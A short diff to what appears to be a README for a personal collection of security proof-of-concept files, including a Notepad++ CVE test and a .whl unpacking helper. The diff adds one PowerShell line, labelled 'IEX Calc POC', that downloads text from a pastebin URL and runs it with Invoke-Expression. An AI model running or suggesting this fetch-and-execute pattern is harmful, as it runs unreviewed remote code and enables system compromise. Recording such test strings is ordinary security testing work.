@@ -31,3 +31,9 @@ Most social media type apps will be Teen [T]
 - `regsvr32.c` and the related `.exe` is a source code for poc testing the NoptePad++ CVE from 2025
 - `scriptfile2.js` is a write test, check comments in the file
 - `whl.ps1` is a helper file to unpack `.whl` files to a location - specifically the .tar files `1package.tar` and `2package.tar` but can be for any large `.whl` sets obv. 
+
+
+### String POCs
+
+IEX Calc POC
+```iex ((Invoke-WebRequest 'https://pastebin.com/raw/Gnb4K1Qq').Content)```
